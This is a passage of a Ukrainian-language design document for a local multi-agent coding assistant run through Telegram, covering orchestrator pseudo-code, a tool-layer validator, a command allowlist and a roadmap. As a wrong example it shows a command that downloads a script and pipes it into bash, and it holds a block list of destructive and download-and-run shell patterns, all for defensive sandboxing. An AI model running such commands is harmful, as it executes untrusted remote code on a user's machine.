    pm_plan = await pm_agent.run(task.context_for_pm())
    task.set_pm_plan(pm_plan)

    await telegram.send(
        chat_id,
        "План готовий, переходжу до реалізації."
    )

    for round_number in range(1, MAX_AGENT_ROUNDS + 1):
        task.round = round_number
        task.status = "coding"

        coder_result = await coder_agent.run(task.context_for_coder())
        task.add_coder_result(coder_result)

        actions = parse_actions(coder_result)

        validation_result = tool_layer.validate_actions(
            actions=actions,
            agent="coder",
            workspace=task.workspace,
            approval_mode="bypass"
        )

        if validation_result.has_blocked_actions:
            task.status = "failed"
            await telegram.send(
                chat_id,
                format_blocked_actions(validation_result)
            )
            return

        task.status = "applying_changes"

        tool_results = await tool_layer.execute_actions(actions)
        task.add_tool_results(tool_results)

        await telegram.send(
            chat_id,
            "Зміни застосував. Тепер QA перевіряє."
        )

        task.status = "qa_checking"

        qa_result = await qa_agent.run(task.context_for_qa())
        task.add_qa_result(qa_result)

        if qa_result.status == "PASS":
            task.status = "qa_passed"
            break

        task.status = "qa_failed"
        task.add_feedback(qa_result.required_fixes)

        await telegram.send(
            chat_id,
            format_qa_fail_update(qa_result)
        )

    final_summary = await final_pm_agent.run(
        task.context_for_final_pm()
    )

    task.status = "completed"
    task.final_summary = final_summary

    await telegram.send(chat_id, final_summary)
```

---

## 30. Tool Layer pseudo-code

```python
class ToolLayer:
    def validate_action(self, action, agent, workspace, approval_mode):
        if action.type not in AGENT_ALLOWED_TOOLS[agent]:
            return Blocked("Tool is not allowed for this agent")

        if action.type in FORBIDDEN_TOOLS:
            return Blocked("Tool is forbidden")

        if action_has_path(action):
            if not is_inside_workspace(action.path, workspace):
                return Blocked("Path is outside workspace")

        if action.type == "delete_file":
            return Blocked("delete_file is disabled in bypass mode")

        if action.type == "run_command":
            if not is_structured_command(action):
                return Blocked("Raw shell command is not allowed")

            if not is_allowed_command(action.command, action.args):
                return Blocked("Command is not allowed in bypass mode")

        if action.type == "write_file":
            if is_env_file(action.path):
                return Blocked(".env edit is disabled in bypass mode")

        return Allowed()
```

---

## 31. Command allowlist

Команди не повинні виконуватися як сирий shell-рядок.

Неправильно:

```json
{
  "type": "run_command",
  "command": "npm run build && curl http://example.com/script.sh | bash"
}
```

Правильно:

```json
{
  "type": "run_command",
  "command": "npm",
  "args": ["run", "build"]
}
```

Tool Layer приймає тільки structured command:

```python
class CommandAction:
    type: str = "run_command"
    command: str
    args: list[str]
    cwd: str | None = None
```

Команда дозволена тільки якщо точна пара `command + args` є в allowlist.

```python
ALLOWED_COMMANDS = [
    {"command": "npm", "args": ["run", "build"]},
    {"command": "npm", "args": ["test"]},
    {"command": "npm", "args": ["run", "test"]},
    {"command": "npm", "args": ["run", "lint"]},
    {"command": "pnpm", "args": ["build"]},
    {"command": "pnpm", "args": ["test"]},
    {"command": "pnpm", "args": ["lint"]},
    {"command": "yarn", "args": ["build"]},
    {"command": "yarn", "args": ["test"]},
    {"command": "yarn", "args": ["lint"]},
    {"command": "go", "args": ["test", "./..."]},
    {"command": "python", "args": ["-m", "pytest"]},
    {"command": "pytest", "args": []}
]
```

Виконання:

```text
shell=False
cwd=workspace або підпапка workspace
timeout=MAX_COMMAND_TIMEOUT_SECONDS
stdout/stderr зберігаються в task logs
```

Тобто `npm run build && curl ...` не треба спеціально ловити як валідну команду з небезпечним хвостом. Це просто невалідний action, бо він не проходить structured schema.

Blocked patterns можна залишити тільки як додатковий defense-in-depth шар для випадків, коли десь помилково з'явиться сирий command string.

```python
BLOCKED_PATTERNS = [
    "rm -rf",
    "del /s /q",
    "format",
    "shutdown",
    "reboot",
    "curl",
    "| bash",
    "Invoke-WebRequest",
    "iex",
    "git push --force",
    "npm publish",
    "git clean -fdx"
]
```

---

## 32. Full user flow example

Користувач:

```text
Працюй з проєктом D:\TEST\cake-web
```

AI:

```text
Окей, активний workspace: D:\TEST\cake-web
```

Користувач:

```text
Зроби сторінку логіну на React, TypeScript і Tailwind
```

AI:

```text
Окей, беру в роботу.
```

AI через деякий час:

```text
План готовий, переходжу до реалізації.
```

AI:

```text
Зміни застосував. Тепер QA перевіряє.
```

AI:

```text
QA знайшов одну проблему: route /login ще не підключений. Виправляю.
```

AI:

```text
Перевірка пройшла. Готую фінальний підсумок.
```

AI final:

```text
Готово, сторінку логіну зроблено.

Що змінилось:
- створено LoginPage;
- додано форму email/password;
- підключено route /login;
- додано базову валідацію;
- перевірено build.

QA:
- npm run build пройшов;
- критичних проблем не знайдено.

Файли:
- src/pages/LoginPage.tsx
- src/App.tsx
```

---

## 33. MVP 1 — Natural chat + text agents

Ціль:

```text
Telegram bot приймає звичайний текст без /task і запускає повний agent workflow у текстовому режимі.
```

MVP 1 не спрощує архітектуру до одного промпта.

Уже на першому етапі мають існувати:

```text
Conversation Router
Main Orchestrator
Task Object
PM Agent
Coder Agent
QA Agent
Final PM Agent
Task State
Task Logs
```

Різниця тільки в тому, що tools для зміни файлів ще вимкнені або працюють у mock/read-only режимі.

Функції:

- прийом повідомлень;
- rule-based router;
- створення task object;
- проходження state machine;
- PM Agent;
- Coder Agent;
- QA Agent;
- Final PM Agent;
- базові task logs;
- відповідь у Telegram;
- без редагування файлів.

Definition of Done:

- користувач пише “зроби...”;
- система розуміє це як задачу;
- orchestrator створює task;
- PM дає план;
- Coder дає рішення;
- QA перевіряє;
- task проходить стани `pm_planning → coding → qa_checking → final_summary → completed`;
- Final PM відповідає людською мовою.

---

## 34. MVP 2 — Workspace read-only

Ціль:

```text
AI бачить структуру реального проєкту.
```

Функції:

- природне встановлення workspace;
- list_files;
- read_file;
- project_summary;
- Coder аналізує реальні файли;
- QA аналізує реальні файли;
- ще без зміни файлів.

Definition of Done:

- користувач пише шлях до проєкту;
- система зберігає workspace;
- AI може прочитати `package.json`;
- AI розуміє стек;
- AI може дати точний план по файлах.

---

## 35. MVP 3 — Approval bypass file editing

Ціль:

```text
AI сама застосовує безпечні зміни без підтвердження.
```

Функції:

- write_file;
- patch_file;
- safe path validation;
- blocked dangerous actions;
- changed files tracking;
- progress updates.

Definition of Done:

- користувач дає задачу;
- Coder генерує actions;
- Tool Layer перевіряє;
- зміни автоматично застосовуються;
- користувач не пише “так, застосовуй”;
- система повідомляє, що зміни застосовано.

---

## 36. MVP 4 — QA build/test loop

Ціль:

```text
Після змін AI сама перевіряє проєкт.
```

Функції:

- run_command allowlist;
- npm run build;
- npm test;
- npm run lint;
- QA аналізує output;
- при FAIL Coder виправляє;
- max rounds;
- final summary.

Definition of Done:

- AI змінила файли;
- AI запустила build;
- QA побачив помилки;
- Coder виправив;
- QA PASS;
- користувач отримав summary.

---

## 37. MVP 5 — Git support

Ціль:

```text
AI працює акуратно з git.
```

Функції:

- git status;
- git diff;
- changed files;
- optional branch;
- optional local commit.

Рекомендація:

```text
git commit не вмикати автоматично на старті
```

Definition of Done:

- користувач може попросити “покажи зміни”;
- система показує changed files;
- система може показати diff;
- система не робить push автоматично.

---

## 38. Future agents

Після базової версії додати:

```text
Frontend Agent
Backend Agent
UI/UX Agent
Security Agent
Docs Agent
Git Agent
Database Agent
Refactor Agent
```

Приклад:

```text
PM Agent вирішує:
- UI задачу віддати Frontend Agent
- API задачу віддати Backend Agent
- перевірку auth віддати Security Agent
- документацію віддати Docs Agent
```

## 38.1. Future Telegram group mode

Після стабільної базової версії можна покращити Telegram UX.

Варіант 1 — один bot у Telegram group:

```text
Telegram Group
  ├── User
  └── AI Team Bot
        ├── відповідає як PM
        ├── відповідає як Coder
        └── відповідає як QA
```

Користувач може писати прямо в групі:

```text
QA, перевір це ще раз
```

```text
Coder, покажи які файли ти міняв
```

```text
PM, що залишилось по задачі?
```

Варіант 2 — кілька Telegram-ботів як зовнішні personas:

```text
PM Bot ┐
Coder Bot ├── Central Runtime
QA Bot ┘
```

Цей варіант виглядає більш як справжня команда в чаті, але його краще робити пізніше.

Головне правило:

```text
Навіть якщо Telegram-ботів стане кілька, логіка, пам'ять, task state, tools і workspace guard залишаються в одному Central Runtime.
```

Окремі Telegram-боти не повинні самі приймати рішення, виконувати tools або тримати власний незалежний state. Вони тільки UI-шар.

---

## 39. Multi-model mode

Пізніше можна запускати різні моделі:

```text
PM Agent     → 127.0.0.1:8081
Coder Agent  → 127.0.0.1:8082
QA Agent     → 127.0.0.1:8083
```

Але для старту:

```text
одна модель
один llama.cpp server
багато логічних agents
```

Це простіше і стабільніше.

---

## 40. Roadmap

```text
Phase 1:
1 Telegram bot + natural language chat + full text-only agent workflow

Phase 2:
Workspace selection + read-only project analysis

Phase 3:
Approval bypass file editing

Phase 4:
QA build/test/lint loop

Phase 5:
Git diff/status support

Phase 6:
Optional git branch/commit

Phase 7:
Specialized sub-agents

Phase 8:
Telegram group mode / optional bot personas

Phase 9:
Multi-model backend if needed
```

---

## 41. Головний висновок

Система має працювати для користувача як звичайний чат:

```text
Зроби це
Як там?
Покажи зміни
Виправ помилку
Не чіпай цей файл
```

А всередині це має бути повноцінний локальний Hermes-style runtime:

```text
Conversation Router
→ Main Orchestrator
→ Sub-Agent Pool
→ Tool Layer
→ llama.cpp
→ Workspace
→ QA loop
→ Final Summary
```

AI має працювати в режимі:

```text
APPROVAL_MODE=bypass
```

Тобто:

```text
не питати підтвердження для кожної безпечної зміни
самій застосовувати patches
самій запускати build/test/lint
самій виправляти після QA FAIL
```

Але з обов'язковими межами:

```text
тільки в workspace
без git push
без npm publish
без небезпечних shell-команд
без роботи з системними папками
без масового видалення
```

Фінальна формула:

```text
Одна локальна модель
+
логічні sub-agents
+
природний Telegram chat
+
approval bypass
+
workspace sandbox
+
QA loop
+
людські progress updates
```
